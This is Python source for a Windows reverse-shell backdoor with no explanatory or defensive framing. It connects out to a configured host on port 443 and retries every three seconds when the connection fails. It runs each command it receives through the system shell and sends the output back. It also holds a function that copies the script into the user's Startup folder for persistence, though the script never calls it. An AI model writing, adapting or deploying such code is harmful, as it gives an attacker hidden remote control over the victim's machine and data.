import socket
import time
import subprocess
import threading
import os

IP = "0.0.0.0"
PORT = 443


def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(filename))


def connect(IP, PORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))
        return client
    except:
        pass

def cmd (client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as error:
        print(error)


def listen(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as e:
        print("Error Listening..". e)
        client.close()

if __name__ == "__main__":
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)
        else:
            time.sleep(3)
